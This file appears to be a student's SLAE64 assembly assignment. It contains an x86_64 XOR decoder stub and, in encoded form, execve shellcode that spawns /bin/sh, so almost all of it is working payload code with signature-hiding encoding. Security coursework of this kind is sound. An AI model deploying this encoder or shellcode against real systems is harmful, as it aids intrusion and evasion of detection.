; Student ID   : SLAE64-1611
; Student Name : Jonathan "Chops" Crosby
; Assignment 4 : Custom Encoder (Linux/x86_64) Assembly
; File Name    : custom-encoder.nasm

global _start

section .text

_start:

        jmp short call_shellcode ; using the jump, call and pop method to get into our shellcode

decoder:
        pop rsi                  ; get the address of EncodedShellcode into rsi

decode:
        mov bl, byte [rsi]       ; moving current byte from shellcode string

        xor bl, 0xff             ; checking if we are done decoding and should
                                 ; jump directly to our shell code 

        jz EncodedShellcode      ; if the current value being evaluated is 0xff
                                 ; then we are at the end of the string 

        mov byte [rsi], bl       ; a by product of the xor is that we get the difference
                                 ; between 0xff and the current encoded byte being evaluated
                                 ; which is infact the actual instruction value to execute!

        inc rsi                  ; move to next byte to be evaluated in our shellcode

        jmp short decode         ; run through decode again

call_shellcode:

        call decoder    ; call our decoder routine

        ; this is our encoded shell string for our x86_64 execve-stack
        EncodedShellcode: db 0xb7,0xce,0x3f,0xb7,0x7c,0x3f,0xc4,0xb2,0xce,0x36,0xbe,0xae,0xb7,0x44,0xd0,0xd0,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xac,0xb7,0x76,0x18,0xbe,0xae,0xb7,0x76,0x1d,0xa8,0xb7,0x76,0x19,0xf0,0xfa,0xff
